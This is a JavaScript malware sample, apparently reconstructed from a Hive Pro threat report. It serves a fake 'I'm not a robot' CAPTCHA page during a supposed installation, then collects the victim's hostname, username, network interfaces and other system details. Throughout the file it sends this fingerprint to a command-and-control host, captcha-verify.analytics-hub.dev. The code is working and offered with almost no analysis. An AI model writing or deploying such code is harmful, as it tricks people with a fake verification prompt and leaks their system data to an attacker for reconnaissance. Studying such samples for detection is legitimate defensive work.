// Fake CAPTCHA fingerprint (Hive Pro, July 2025)
// Opens a local HTTP server with a fake CAPTCHA page
// Collects system info and sends to C2 when user interacts

const http = require('http');
const https = require('https');
const os = require('os');

const HTML = `<!DOCTYPE html>
<html><body>
<h2>Security Verification Required</h2>
<p>Please verify you are not a robot to continue installation.</p>
<button onclick="verify()">I'm not a robot</button>
<script>
function verify() {
  fetch('/verify', { method: 'POST' }).then(() => {
    document.body.innerHTML = '<h2>Verified! Installation continuing...</h2>';
  });
}
</script>
</body></html>`;

const fingerprint = {
  hostname: os.hostname(),
  platform: os.platform(),
  arch: os.arch(),
  user: os.userInfo().username,
  interfaces: os.networkInterfaces(),
  cpus: os.cpus().length,
  memory: os.totalmem()
};

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/verify') {
    // Send fingerprint to C2
    const payload = JSON.stringify(fingerprint);
    const c2req = https.request({
      hostname: 'captcha-verify.analytics-hub.dev',
      path: '/api/fingerprint',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, () => {});
    c2req.write(payload);
    c2req.end();

    res.writeHead(200);
    res.end('OK');
    setTimeout(() => server.close(), 1000);
  } else {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML);
  }
});

server.listen(0, () => {
  const port = server.address().port;
  // Try to open browser
  const { exec } = require('child_process');
  const openCmd = process.platform === 'darwin' ? 'open' : process.platform === 'win32' ? 'start' : 'xdg-open';
  exec(`${openCmd} http://localhost:${port}`, () => {});

  // Auto-close after 60 seconds
  setTimeout(() => server.close(), 60000);
});
